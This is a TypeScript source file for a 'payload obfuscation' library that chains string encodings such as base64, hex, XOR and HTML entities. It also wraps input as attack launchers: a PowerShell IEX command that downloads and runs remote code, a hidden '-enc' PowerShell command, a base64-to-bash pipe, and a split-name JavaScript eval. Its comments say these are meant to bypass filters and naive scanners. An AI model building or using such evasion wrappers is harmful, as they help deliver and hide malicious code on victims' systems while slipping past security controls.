// String-transform library for payload obfuscation. Pure JS.
//
// Each transform takes a string + optional key, returns a string. Transforms
// are chainable (the page applies them in order from top to bottom of the
// chain list).

export type TransformId =
  | "base64" | "base64url"
  | "hex" | "hex-pad"
  | "urlencode" | "urlencode-all"
  | "unicode-escape" | "hex-escape"
  | "html-entities"
  | "xor"            // requires `key`
  | "reverse"
  | "double-base64"
  | "uppercase" | "lowercase"
  | "powershell-iex" | "powershell-base64-cmd"
  | "bash-base64"
  | "concat-eval-js"; // wraps in eval(window['e' + 'val'](...)) trickery

export type Transform = {
  id: TransformId;
  key?: string;  // only for XOR; ignored otherwise
};

type Def = {
  id: TransformId;
  label: string;
  description: string;
  needsKey?: boolean;
};

export const TRANSFORMS: Def[] = [
  { id: "base64",        label: "Base64",                  description: "Standard base64 encode" },
  { id: "base64url",     label: "Base64 (URL-safe)",       description: "URL-safe base64 (RFC 4648 §5), no padding" },
  { id: "hex",           label: "Hex",                     description: "Plain hex (lowercase, no separator)" },
  { id: "hex-pad",       label: "Hex (\\x prefixed)",       description: "Hex bytes prefixed with \\x — e.g. \\x41\\x42" },
  { id: "urlencode",     label: "URL-encode",              description: "Only unsafe chars (encodeURIComponent)" },
  { id: "urlencode-all", label: "URL-encode (all)",        description: "Every byte percent-encoded — bypasses some filters" },
  { id: "unicode-escape",label: "Unicode escape",          description: "Each char → \\u00XX form" },
  { id: "hex-escape",    label: "JS hex escape",           description: "Each char → \\xXX form (JS string literal)" },
  { id: "html-entities", label: "HTML entities",           description: "Each char → &#NN; decimal entity" },
  { id: "xor",           label: "XOR with key",            description: "Byte-XOR each char with rotating key; output as hex", needsKey: true },
  { id: "reverse",       label: "Reverse",                 description: "Reverse the string" },
  { id: "double-base64", label: "Double Base64",           description: "Base64 → Base64 again" },
  { id: "uppercase",     label: "Uppercase",               description: "Just toUpperCase()" },
  { id: "lowercase",     label: "Lowercase",               description: "Just toLowerCase()" },
  { id: "powershell-iex",label: "PowerShell IEX wrap",     description: "Wrap as IEX (New-Object Net.WebClient).DownloadString(...)" },
  { id: "powershell-base64-cmd", label: "PowerShell -enc command", description: "powershell.exe -nop -w hidden -enc <UTF16-LE base64>" },
  { id: "bash-base64",   label: "Bash base64 -d pipe",      description: "echo <base64> | base64 -d | bash" },
  { id: "concat-eval-js",label: "JS eval-concat wrap",     description: "Wrap as concat'd-name eval to bypass naive scanners" },
];

// ── Implementations ────────────────────────────────────────────────────────

const enc = new TextEncoder();

function toBase64(s: string): string {
  // Robust unicode → base64 via TextEncoder + btoa over bytes
  const bytes = enc.encode(s);
  let bin = "";
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin);
}

function toBase64Url(s: string): string {
  return toBase64(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function toHex(s: string, sep = ""): string {
  return [...enc.encode(s)].map((b) => sep + b.toString(16).padStart(2, "0")).join("");
}

function toUnicodeEscape(s: string): string {
  return [...s].map((ch) => "\\u" + ch.charCodeAt(0).toString(16).padStart(4, "0")).join("");
}

function toHexEscape(s: string): string {
  return [...enc.encode(s)].map((b) => "\\x" + b.toString(16).padStart(2, "0")).join("");
}

function toHtmlEntities(s: string): string {
  return [...s].map((ch) => "&#" + ch.charCodeAt(0) + ";").join("");
}

function xorWithKey(s: string, key: string): string {
  if (!key) return s;
  const bytes = enc.encode(s);
  const k = enc.encode(key);
  let out = "";
  for (let i = 0; i < bytes.length; i++) {
    out += (bytes[i] ^ k[i % k.length]).toString(16).padStart(2, "0");
  }
  return out;
}

function powershellEncCmd(s: string): string {
  // PowerShell -enc expects UTF-16 LE base64
  const utf16 = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) {
    const c = s.charCodeAt(i);
    utf16[i * 2] = c & 0xff;
    utf16[i * 2 + 1] = (c >> 8) & 0xff;
  }
  let bin = "";
  for (const b of utf16) bin += String.fromCharCode(b);
  const b64 = btoa(bin);
  return `powershell.exe -nop -w hidden -enc ${b64}`;
}

export function applyTransform(input: string, t: Transform): string {
  switch (t.id) {
    case "base64":         return toBase64(input);
    case "base64url":      return toBase64Url(input);
    case "hex":            return toHex(input);
    case "hex-pad":        return toHex(input, "\\x");
    case "urlencode":      return encodeURIComponent(input);
    case "urlencode-all":  return [...enc.encode(input)]
                                  .map((b) => "%" + b.toString(16).padStart(2, "0").toUpperCase())
                                  .join("");
    case "unicode-escape": return toUnicodeEscape(input);
    case "hex-escape":     return toHexEscape(input);
    case "html-entities":  return toHtmlEntities(input);
    case "xor":            return xorWithKey(input, t.key ?? "");
    case "reverse":        return [...input].reverse().join("");
    case "double-base64":  return toBase64(toBase64(input));
    case "uppercase":      return input.toUpperCase();
    case "lowercase":      return input.toLowerCase();
    case "powershell-iex":
      return `IEX (New-Object Net.WebClient).DownloadString('${input.replace(/'/g, "''")}')`;
    case "powershell-base64-cmd": return powershellEncCmd(input);
    case "bash-base64":    return `echo ${toBase64(input)} | base64 -d | bash`;
    case "concat-eval-js":
      // Splits the function name so naive regex won't catch "eval"
      return `(window['ev'+'al'])(atob('${toBase64(input)}'))`;
    default:
      return input;
  }
}

export function applyChain(input: string, chain: Transform[]): string {
  let out = input;
  for (const t of chain) {
    try { out = applyTransform(out, t); }
    catch (e) { return `[error in ${t.id}: ${e instanceof Error ? e.message : e}]`; }
  }
  return out;
}
